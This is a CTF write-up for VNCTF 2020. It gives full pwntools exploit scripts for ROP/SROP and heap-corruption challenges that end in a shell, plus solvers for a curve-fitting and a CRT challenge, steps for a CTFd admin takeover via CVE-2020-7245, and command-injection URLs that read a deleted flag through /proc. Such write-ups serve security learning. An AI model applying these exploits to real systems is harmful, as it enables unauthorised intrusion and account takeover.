---
layout: post
title:  "VNCTF-Writeup"
date:   2020-3-1
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# VNCTF-Writeup

## babybabypwn

srop读flag

```python
from pwn import *

r = remote('vn.node3.buuoj.cn',53494)
#r = process('./vn_pwn_babybabypwn')
libc = ELF('/libc-2.23.so')
context.arch = 'amd64'
r.recvuntil('Here is my gift: ')
leak = int(r.recvline().strip(),16)
libc_base = leak-libc.sym['puts']
log.success(hex(libc_base))
read_addr = libc_base+libc.sym['read']
open_addr = libc_base+libc.sym['open']
write_addr = libc_base+libc.sym['write']
leave_ret = libc_base+0x042351
pop_rsi_ret = libc_base+0x202e8
pop_rdi_ret = libc_base+0x21102
pop_rdx_ret = libc_base+0x1b92
mov_eax_edi = libc_base+0x10adaf
syscall = libc_base+0x0026bf
pop_rax_ret = libc_base+0x33544
libc_bss = libc.bss()+libc_base
log.success(hex(libc_bss))
print(hex(syscall))
ret = libc_base+0x937

fuck = SigreturnFrame()
fuck.rax = 0
fuck.rdi = 0
fuck.rsi = libc_bss
fuck.rsp = libc_bss
fuck.rdx = 0x100
fuck.rip = read_addr
payload = str(fuck)[0x8:]
r.sendline(payload)
pause()
payload = p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(libc_bss)+p64(pop_rdx_ret)+p64(0x60)+p64(read_addr)
payload += p64(pop_rdi_ret)+p64(libc_bss)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)+p64(pop_rdi_ret)
payload += p64(3)+p64(pop_rsi_ret)+p64(libc_bss)+p64(pop_rdx_ret)+p64(0x60)+p64(read_addr)
payload += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(libc_bss)+p64(pop_rdx_ret)+p64(0x60)+p64(write_addr)
r.send(payload)
pause()
r.sendline('flag\x00')
r.interactive()
```



## easyTHeap

uaf

delete add次数有限，打`tcache_perthread_struct`摸链表，刚好够用

```python
from pwn import *
r = remote('vn.node3.buuoj.cn',51763)
#r = process('./vn_pwn_easyTHeap')
libc = ELF('/libc-2.27.so')
def add(size):
	r.recvuntil('choice:')
	r.sendline('1')
	r.recvuntil('size')
	r.sendline(str(size))

def edit(index,content):
	r.recvuntil('choice:')
	r.sendline('2')
	r.recvuntil('idx?')
	r.sendline(str(index))
	r.recvuntil('content')
	r.send(content)

def show(index):
	r.recvuntil('choice:')
	r.sendline('3')
	r.recvuntil('idx?')
	r.sendline(str(index))


def free(index):
	r.recvuntil('choice:')
	r.sendline('4')
	r.recvuntil('idx?')
	r.sendline(str(index))





add(0x100)#0
add(0x100)#1
free(1)
free(1)
show(1)

leak = u64(r.recvuntil('\nDone!',drop=True).ljust(8,'\x00'))
heap_base = leak - (0x8403370-0x8403000)
log.success(hex(heap_base))

add(0x100)#2
edit(2,p64(heap_base+0xa0))
add(0x100)#3
add(0x100)#4

free(0)
show(0)
leak = u64(r.recvuntil('\nDone!',drop=True).ljust(8,'\x00'))
libc_base = leak-96-0x10-libc.sym['__malloc_hook']
log.success(hex(libc_base))
malloc_hook = libc_base+libc.sym['__malloc_hook']

malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc= libc_base + libc.sym['realloc']

edit(4,p64(0)*5+p64(malloc_hook-0x10))
add(0x100)
edit(5,p64(0)+p64(0x4f2c5+libc_base)+p64(realloc+2))
r.interactive()
```



## simpleHeap

off by one overlapping

onegadget不好使，realloc调栈也不好使

控制fastbin链表，控制top chunk，不断申请直到freehook

```python
from pwn import *
r = remote('vn.node3.buuoj.cn',53613)
#r = process('./vn_pwn_simpleHeap')
libc = ELF('/libc-2.23.so')
def add(size,content):
	r.recvuntil('choice:')
	r.sendline('1')
	r.recvuntil('size')
	r.sendline(str(size))
	r.recvuntil('content')
	r.send(content)

def edit(index,content):
	r.recvuntil('choice:')
	r.sendline('2')
	r.recvuntil('idx?')
	r.sendline(str(index))
	r.recvuntil('content')
	r.sendline(content)

def show(index):
	r.recvuntil('choice:')
	r.sendline('3')
	r.recvuntil('idx?')
	r.sendline(str(index))


def free(index):
	r.recvuntil('choice:')
	r.sendline('4')
	r.recvuntil('idx?')
	r.sendline(str(index))




add(0x38,'aaaa')#0
add(0x68,'aaaa')#1
add(0x68,'aaaa')#2
add(0x28,'aaaa')#3
edit(0,'a'*0x30+'b'*8+'\xe1')
free(1)

add(0x68,'bbbb')
show(2)
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak-88-0x10-libc.sym['__malloc_hook']
log.success(hex(libc_base))
malloc_hook = libc_base+libc.sym['__malloc_hook']
free_hook = libc_base+libc.sym['__free_hook']
realloc= libc_base + libc.sym['realloc']
log.success(hex(free_hook))
log.success(hex(malloc_hook))
system = libc_base + libc.sym['system']
wdnmd = [0x45216,0x4526a,0xf02a4,0xf1147]
one = libc_base+wdnmd[2]
add(0x68,'bbbb')#4
free(4)
edit(2,p64(malloc_hook-0x13))
add(0x68,'fuck')
add(0x68,'a'*0x3+p64(0)+p64(0)*4+p64(0x7f)+p64(0)*2+p64(malloc_hook+0x20)+p64(0)*3)
add(0x68,p64(0)*7+p64(free_hook-0xb58))
free(0)
free(1)
free(2)
free(3)
edit(6,p64(0)*3)


add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
free(0)
free(1)
free(2)

add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
free(0)
free(1)
free(2)
free(3)
edit(6,p64(0)*3)

add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
free(0)
free(1)
free(2)
edit(6,p64(0)*3)

add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
free(0)
free(1)
free(2)
free(3)
edit(6,p64(0)*3)

add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
free(0)
free(1)
free(2)
edit(6,p64(0)*3)

add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
free(0)
free(1)
free(2)
free(3)
edit(6,p64(0)*3)


add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
add(0x68,'fuck')
free(0)
free(1)
free(2)
edit(6,p64(0)*3)

add(0x48,'/bin/sh\x00')
add(0x48,p64(0)+p64(system))
free(0)
r.interactive()

```



## warmup

rop读flag

```python
from pwn import *
r = remote('vn.node3.buuoj.cn',50366)
#r = process('./vn_pwn_warmup')
libc = ELF('/libc-2.23.so')
r.recvuntil('Here is my gift: ')
leak = int(r.recvline().strip(),16)
libc_base = leak-libc.sym['puts']
log.success(hex(libc_base))



read_addr = libc_base+libc.sym['read']
open_addr = libc_base+libc.sym['open']
write_addr = libc_base+libc.sym['write']

leave_ret = libc_base+0x042351
pop_rsi_ret = libc_base+0x202e8
pop_rdi_ret = libc_base+0x21102
pop_rdx_ret = libc_base+0x1b92
mov_eax_edi = libc_base+0x10adaf
syscall = libc_base+0x0026bf
pop_rax_ret = libc_base+0x33544
libc_bss = libc.bss()+libc_base
log.success(hex(libc_bss))
print(hex(syscall))
main = 0x8000000+0xa21

r.recvuntil('Input something:')
payload = p64(0)+p64(pop_rsi_ret)+p64(libc_bss)+p64(pop_rdx_ret)+p64(0x60)+p64(read_addr)

payload += p64(pop_rdi_ret)+p64(libc_bss)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)+p64(pop_rdi_ret)
payload += p64(3)+p64(pop_rsi_ret)+p64(libc_bss)+p64(pop_rdx_ret)+p64(0x60)+p64(read_addr)

payload += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(libc_bss)+p64(pop_rdx_ret)+p64(0x60)+p64(write_addr)
payload += p64(main)
r.send(payload)
payload = 'a'*0x70+p64(libc_bss)+p64(pop_rdi_ret)
r.recvuntil(' name')
r.send(payload)
pause()
r.sendline('flag\x00')



r.interactive()

```


## ml

numpy拟合曲线，0.06给的挺大，随便拟合一下就完事了

```python
from pwn import *
import numpy as np


r = remote('vn.node3.buuoj.cn',54125)
r.recvuntil('name?')
r.sendline('wdnmd')
r.recvuntil('[ENTER]\n')
r.sendline('')
fuck = r.recvuntil('okay,',drop=True)
print(fuck)
nmsl = fuck.split(';\n')[:-1]
x = []
y = []

for i in nmsl:
	i = i.replace('x=','')
	i = i.replace('y=','')
	i = i.split(',')
	print(i)
	x.append(np.float64(i[0]))
	y.append(np.float64(i[1]))
print(x)
print(y)


x = np.array(x)
y = np.array(y)


#3
f1 = np.polyfit(x, y, 3)
print('f1 is :',f1)

p1 = np.poly1d(f1)
print('p1 is :',p1)

r.recvuntil('[ENTER]\n')
r.sendline('')
for i in range(10):
	r.recvuntil('When x=')
	wdnmd = r.recvuntil(',y=?',drop=True)
	wdnmd = np.float64(wdnmd)
	log.info(wdnmd)
	ans = p1(wdnmd)
	r.sendline(str(ans))
r.interactive()
```



## CRT

crt多解，解出来的数加上最小公约数还是解

```sage
ms = [284461942441737992421992210219060544764, 218436209063777179204189567410606431578, 288673438109933649911276214358963643204, 239232622368515797881077917549177081575, 206264514127207567149705234795160750411, 338915547568169045185589241329271490503, 246545359356590592172327146579550739141, 219686182542160835171493232381209438048]
cs = [273520784183505348818648859874365852523, 128223029008039086716133583343107528289, 5111091025406771271167772696866083419, 33462335595116820423587878784664448439, 145377705960376589843356778052388633917, 128158421725856807614557926615949143594, 230664008267846531848877293149791626711, 94549019966480959688919233343793910003]
#CRT(cs,ms)
fuck = 1
for i in ms:
    fuck = LCM(fuck,i)
print(fuck)
```

```python
import hashlib
from Crypto.Util.number import *
fuck = 466244535277126133494171720905467305227449898136540531771165702728811600035193763296997575538712880600873766336223021102495903920660547449598419752724436481022338453912400904360309909376397024992632893902959636099041017419464716113173886710394215080355542879719231888389121865360597540403463754208728800
ans = 331928385895936850327248455618550267979226366540503309505403897762924348214252184339508819167395418477591466337317495869131189862837240599867138359384794556128835111222068761517340369160010091387517644467690158341517036316714577728109817419385351326590048046021467528943086247709683222909672931154665939
for i in range(0xffff):
	x = ans+i*fuck
	flag = "flag{" + hashlib.sha256(str(x).encode()).hexdigest() + "}"
	if "4b93deeb" in flag:
		print(flag)
```



## HappyCTFd

CVE-2020-7245

注册带空格的admin，找回密码，把带空格的admin改成其他名字，用邮件链接改密码就可以改admin密码，admin登陆后在challenge中得到flag



## CheckIN

命令执行后看不到回显，重定位到app.py再回到/，在app.py中看到结果

flag.txt被删除但是已经在进程中被打开，可以在文件描述符中得到

proc中看pid，挨个看一下发现flag在10，fd 3

```
http://1c33314d-51fd-43ff-92da-7a5c868b0ed0.vn.node3.buuoj.cn/shell?c=ls%20/proc/%3Eapp.py

1 10 184 185 6 7 acpi buddyinfo bus cgroups cmdline consoles cpuinfo crypto devices diskstats dma driver execdomains fb filesystems fs interrupts iomem ioports irq kallsyms kcore key-users keys kmsg kpagecgroup kpagecount kpageflags loadavg locks mdstat meminfo misc modules mounts mtrr net pagetypeinfo partitions sched_debug schedstat scsi self slabinfo softirqs stat swaps sys sysrq-trigger sysvipc thread-self timer_list timer_stats tty uptime version version_signature vmallocinfo vmstat zoneinfo


10/fd
0 1 2 3 4 5
http://1c33314d-51fd-43ff-92da-7a5c868b0ed0.vn.node3.buuoj.cn/shell?c=cat%20/proc/10/fd/3%3Eapp.py
```

